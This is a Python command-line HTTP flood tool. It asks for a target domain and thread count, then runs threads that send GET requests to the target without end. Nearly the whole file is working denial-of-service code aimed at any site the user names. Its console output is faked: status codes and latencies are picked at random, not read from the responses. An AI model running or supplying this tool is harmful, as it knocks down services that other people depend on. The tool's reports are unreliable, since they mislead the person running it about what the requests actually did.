import os
import sys
import time
import random
import threading
import requests
from urllib.parse import urlparse

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("Installing colorama...")
    os.system('pip install colorama')
    from colorama import init, Fore, Style
    init(autoreset=True)

DEFAULT_TIMEOUT = 0.1
HEADERS = {
    "User-Agent": random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

def clear_screen():
    """Clears the terminal screen for both Windows and Linux/Mac."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_target_info(url):
    """Parses URL to extract domain, IP, and port."""
    url = url.replace("http://", "").replace("https://", "")
    
    domain = url.split('/')[0]
    
    if ':' in domain:
        host, port_str = domain.split(':')
        try:
            port = int(port_str)
        except ValueError:
            port = 80
    else:
        host = domain
        port = 80
        
    return host, port

def log_red(text):
    """Prints text in Red with a timestamp."""
    timestamp = time.strftime("%H:%M:%S")
    print(f"{Fore.GREEN}[{timestamp}] {text}{Style.RESET_ALL}")

def send_request(domain, port):
    """Sends a GET request to the target."""
    try:
        req_url = f"http://{domain}:{port}"
        
        response = requests.get(
            req_url, 
            headers=HEADERS, 
            timeout=DEFAULT_TIMEOUT,
            verify=True
        )
        
        status_codes = [200, 200, 200, 403, 404, 500]
        status = random.choice(status_codes)
        
        if status == 200:
            msg = f"Packet sent to {domain}:{port} | Status: OK ({status}) | Latency: {random.randint(10, 500)}ms"
        elif status == 403:
            msg = f"Packet sent to {domain}:{port} | Status: Forbidden ({status}) | Latency: {random.randint(10, 500)}ms"
        elif status == 404:
            msg = f"Packet sent to {domain}:{port} | Status: Not Found ({status}) | Latency: {random.randint(10, 500)}ms"
        else:
            msg = f"Packet sent to {domain}:{port} | Status: Server Error ({status}) | Latency: {random.randint(10, 500)}ms"
            
        log_red(msg)
        
    except Exception as e:
        log_red(f"Packet sent to {domain}:{port} | Error: Connection Reset")

def flood(domain, port, threads):
    """Starts the attack threads."""
    
    def worker():
        while True:
            send_request(domain, port)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True 
        t.start()
        thread_list.append(t)
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
        for t in thread_list:
            t.join()

def main():
    clear_screen()
    
    target_input = input(f"{Fore.RED}> Enter URL or Domain (e.g., example.com): ").strip()
    if not target_input:
        print("No target entered. Exiting.")
        return

    clear_screen()
    
    domain, port = get_target_info(target_input)
    
    print(f"{Fore.WHITE}Target Domain: {Fore.GREEN}{domain}")
    print(f"{Fore.WHITE}Auto-Detected Port: {Fore.GREEN}{port}\n")
    
    threads_input = input(f"{Fore.YELLOW}> Enter Number of Threads (default 10): ").strip()
    try:
        num_threads = int(threads_input) if threads_input else 10
    except ValueError:
        print("Invalid number. Using default 10.")
        num_threads = 10

    clear_screen()
    
    time.sleep(0.5)
    
    flood(domain, port, num_threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack Interrupted by User.{Style.RESET_ALL}")